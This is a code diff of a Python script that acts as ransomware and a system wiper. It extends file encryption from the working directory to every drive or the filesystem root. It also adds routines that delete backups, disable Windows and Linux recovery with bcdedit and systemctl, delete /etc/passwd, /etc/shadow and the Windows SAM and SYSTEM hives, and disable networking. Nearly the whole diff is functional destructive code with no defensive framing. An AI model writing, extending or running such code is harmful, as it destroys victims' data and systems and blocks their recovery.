@@ -4,6 +4,7 @@ import os
 import shutil
 import subprocess
 from cryptography.fernet import Fernet
+import platform
 
 # Function to find all files in a directory
 def find_files(directory):
@@ -15,11 +16,21 @@ def find_files(directory):
             files.append(os.path.join(root, file_name))
     return files
 
-# Ensure current directory is included
-current_directory = os.getcwd()
+# Function to get all root directories for encryption
+def get_root_directories():
+    if platform.system() == "Windows":
+        drives = []
+        for drive in range(65, 91):
+            if os.path.exists(chr(drive) + ':\\'):
+                drives.append(chr(drive) + ':\\')
+        return drives
+    else:
+        return ['/']
 
-# Finding all files starting from current directory
-files = find_files(current_directory)
+# Finding all files starting from root directories
+files = []
+for root_dir in get_root_directories():
+    files.extend(find_files(root_dir))
 
 print("Files to be encrypted:", files)
 
@@ -30,7 +41,7 @@ key = Fernet.generate_key()
 with open("thekey.key", "wb") as thekey:
     thekey.write(key)
 
-# Encrypting all the files in cwd
+# Encrypting all the files found
 for file in files:
     try:
         with open(file, "rb") as thefile:
@@ -46,13 +57,13 @@ print("Encryption process completed.")
 
 # Remove system backups and disable recovery options (DANGEROUS)
 def remove_backups():
-    backup_paths = [
-        "/var/backups",
-        "/mnt/backup",
-        "/etc/backups",
-        # Add more paths as necessary
-    ]
-    for path in backup_paths:
+    backup_paths = {
+        "Linux": ["/var/backups", "/mnt/backup", "/etc/backups"],
+        "Windows": [os.path.join(os.getenv("ProgramData"), "Microsoft\\Windows\\SystemData\\S-1-5-18\\AppData\\Roaming\\Microsoft\\Windows\\Libraries\\Backups"),
+                    os.path.join(os.getenv("ProgramData"), "Microsoft\\Windows\\SystemData\\S-1-5-18\\AppData\\Local\\Microsoft\\Windows\\Libraries\\Backups")]
+    }
+    paths = backup_paths.get(platform.system(), [])
+    for path in paths:
         try:
             shutil.rmtree(path)
             print(f"Removed backup at {path}")
@@ -60,18 +71,57 @@ def remove_backups():
             print(f"Could not remove backup at {path} due to {e}")
 
 def disable_recovery():
-    try:
-        # Disable system recovery (specific to certain systems)
-        subprocess.run(["systemctl", "disable", "--now", "recovery"], check=True)
-        print("Disabled system recovery")
-    except Exception as e:
-        print(f"Could not disable system recovery due to {e}")
+    if platform.system() == "Windows":
+        try:
+            subprocess.run(["bcdedit", "/set", "{default}", "recoveryenabled", "No"], check=True)
+            print("Disabled Windows recovery")
+        except Exception as e:
+            print(f"Could not disable Windows recovery due to {e}")
+    elif platform.system() == "Linux":
+        try:
+            subprocess.run(["systemctl", "disable", "--now", "recovery"], check=True)
+            print("Disabled Linux recovery")
+        except Exception as e:
+            print(f"Could not disable Linux recovery due to {e}")
+
+# Delete important system files (DANGEROUS)
+def delete_important_files():
+    important_files = {
+        "Linux": ["/etc/passwd", "/etc/shadow"],
+        "Windows": [os.path.join(os.getenv("SystemRoot"), "System32\\config\\SAM"),
+                    os.path.join(os.getenv("SystemRoot"), "System32\\config\\SYSTEM")]
+    }
+    files = important_files.get(platform.system(), [])
+    for file in files:
+        try:
+            os.remove(file)
+            print(f"Deleted {file}")
+        except Exception as e:
+            print(f"Could not delete {file} due to {e}")
+
+# Disable network interfaces (DANGEROUS)
+def disable_network():
+    if platform.system() == "Windows":
+        try:
+            subprocess.run(["netsh", "interface", "set", "interface", "Ethernet", "admin=disable"], check=True)
+            print("Disabled network interface on Windows")
+        except Exception as e:
+            print(f"Could not disable network interfaces on Windows due to {e}")
+    elif platform.system() == "Linux":
+        try:
+            subprocess.run(["nmcli", "networking", "off"], check=True)
+            print("Disabled network interfaces on Linux")
+        except Exception as e:
+            print(f"Could not disable network interfaces on Linux due to {e}")
 
 # Execute catastrophic actions
 remove_backups()
 disable_recovery()
+delete_important_files()
+disable_network()
 
 print("Catastrophic actions completed.")
+
 
 
 
